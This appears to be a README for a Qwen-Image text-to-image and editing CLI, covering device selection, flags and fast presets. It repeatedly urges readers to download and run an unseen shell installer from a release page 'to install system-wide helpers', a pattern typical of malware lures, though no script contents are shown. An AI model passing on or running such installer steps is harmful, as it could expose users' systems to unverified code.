# Qwen Image MPS/CUDA/CPU — Text-to-Image & Editing CLI

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/lagmgame/qwen-image-mps/releases)

Generate and edit images from text prompts. The tool chooses the best device available on your system: Apple Silicon (MPS), NVIDIA CUDA, or CPU. It ships a small CLI, fast presets, and timestamped outputs to avoid overwrites.

![Example image](example.png)

- Platform: macOS (MPS), Linux (CUDA), Windows (CUDA/CPU)
- Model: Qwen-Image via Hugging Face Diffusers
- Integrations: Lightning LoRA for fast modes

## Key features

- Auto device selection: prefer MPS, then CUDA, then CPU.
- Text-to-image generation and text-guided image editing.
- CLI interface with prompt, steps, seeds, and output path.
- Multi-image generation with --num-images.
- Timestamped filenames to avoid overwriting previous runs.
- Fast mode (8 steps) and Ultra-fast mode (4 steps) using Lightning LoRA.
- Auto-download of LoRA files when needed.
- Minimal dependencies. Works with PyPI package or from source.

## Quick links

- Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
  Download the installer file qwen-image-mps-installer.sh from the releases page and run it.

[![Get Releases](https://img.shields.io/badge/Get%20Releases-%20Download-brightgreen?logo=github)](https://github.com/lagmgame/qwen-image-mps/releases)

## Installation

Option A — Install from PyPI (recommended)

Run:

```bash
python -m pip install --upgrade pip
pip install qwen-image-mps
```

Option B — Run the installer from Releases

1. Visit the Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
2. Download the file named qwen-image-mps-installer.sh from the release assets.  
3. Make it executable and run it:

```bash
chmod +x qwen-image-mps-installer.sh
./qwen-image-mps-installer.sh
```

Option C — From source

```bash
git clone https://github.com/lagmgame/qwen-image-mps.git
cd qwen-image-mps
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

System requirements

- Python 3.10 or 3.11
- torch with MPS support (macOS 12.3+) or CUDA-enabled torch for NVIDIA GPUs
- ~8 GB RAM for light use, more for larger batches or high-res outputs

## Device selection

The CLI picks a device in this order:

1. MPS (Apple Silicon) if torch.backends.mps.is_available()
2. CUDA if torch.cuda.is_available()
3. CPU otherwise

You can override selection with --device flag. Valid values: mps, cuda, cpu.

## Basic usage

Generate a single image:

```bash
qwen-image --prompt "A cozy cabin in the snowy woods, evening light" --steps 30 --output-dir outputs
```

Generate 4 images in one run:

```bash
qwen-image --prompt "Futuristic city skyline at sunset" --num-images 4 --steps 28
```

Use a fixed seed for reproducible results:

```bash
qwen-image --prompt "Studio portrait, dramatic lighting" --seed 42 --steps 40
```

Use fast presets (Lightning LoRA auto-download):

- Fast mode (8 steps):

```bash
qwen-image --prompt "Minimalist poster design" --mode fast --num-images 6
```

- Ultra-fast mode (4 steps):

```bash
qwen-image --prompt "Icon-style robot character" --mode ultra-fast --num-images 8
```

Edit an existing image using a text instruction:

```bash
qwen-image --edit --image ./inputs/person.jpg --prompt "Change background to a sunny beach" --steps 25
```

Save outputs to a custom folder:

```bash
qwen-image --prompt "Low-poly mountain range" --output-dir my-renders
```

All output filenames include a timestamp and a short hash to avoid accidental overwrites.

## CLI reference

Common flags

- --prompt TEXT (required): Text prompt for generation.
- --edit: Enable image edit mode. Requires --image.
- --image PATH: Input image for editing.
- --steps N: Number of diffusion steps (default 30).
- --num-images N: Number of images to generate in one run (default 1).
- --seed N: Random seed for reproducible outputs.
- --mode {default,fast,ultra-fast}: Generation mode. fast uses Lightning LoRA 8-step; ultra-fast uses 4-step LoRA.
- --device {mps,cuda,cpu}: Force device.
- --output-dir PATH: Directory to save images.
- --height H, --width W: Output resolution (maintain model limits).
- --help: Show help.

Example: combine flags

```bash
qwen-image --prompt "Retro sci-fi poster, neon colors" --num-images 3 --mode fast --device mps --output-dir outputs/sci-fi
```

## How generation and editing work

- The tool uses the Hugging Face Diffusers pipeline with the Qwen-Image model.
- For edits, it applies mask-guided or inpainting steps based on the provided input image and prompt.
- Fast and ultra-fast modes apply a lightweight LoRA model that trades some fidelity for much fewer steps.
- The CLI handles model and LoRA downloads, caching them to the user cache directory.

## Performance tips

- Use MPS on Apple Silicon for a good balance of speed and memory.
- Use CUDA on NVIDIA GPUs for best raw throughput.
- Use --mode fast or --mode ultra-fast for many quick drafts.
- Lower resolution reduces VRAM and speeds up generation.
- Use a fixed seed to compare parameter changes.

## Troubleshooting

Check device availability from Python:

```python
import torch
print("MPS:", getattr(torch.backends, "mps", None) and torch.backends.mps.is_available())
print("CUDA:", torch.cuda.is_available(), "count:", torch.cuda.device_count())
```

If a model asset fails to download, rerun the CLI. The installer and CLI will retry cached downloads on next run.

If you hit memory limits, try lower resolution or set --num-images 1.

## Output layout

Default output directory: ./outputs

Files are named like:

outputs/2025-08-12_153045_ab12cd34.png

This format preserves previous runs and makes it easy to script automation.

## Integrations and internals

- Models: Qwen-Image via Hugging Face model hub.
- Pipeline: diffusers pipelines, inpainting when editing.
- Fast modes: Lightning LoRA weights applied at runtime.
- Storage: model files and LoRA cached under the standard cache directory.

## Examples and presets

Example prompts to try

- "A fantasy castle on a cliff, sunrise, painterly"
- "Close up macro of a mechanical watch, shallow depth of field"
- "Isometric game scene: marketplace, busy stalls, stylized colors"

Preset flows

1. Drafting: use --mode ultra-fast with --num-images 6 to get many variants.
2. Select best candidate.
3. Edit: use --edit with a focused prompt to refine composition or background.
4. Final render: use higher steps (40+) and larger resolution.

## Contributing

- Fork the repo.
- Create a feature branch.
- Run tests and linting: pip install -r dev-requirements.txt then run pytest and flake8.
- Open a pull request with a clear description and a minimal reproducible change.

Development tips

- Use a local virtual env for testing.
- Keep changes small and focused.
- Add tests for pipeline changes.

## Releases

Download installer and release assets from the Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
Get the file qwen-image-mps-installer.sh from the release assets and execute it to install system-wide helpers.

## License

This repository uses the MIT License. See the LICENSE file for details.

## Acknowledgments

- Hugging Face Diffusers
- Qwen-Image model creators
- Lightning LoRA community

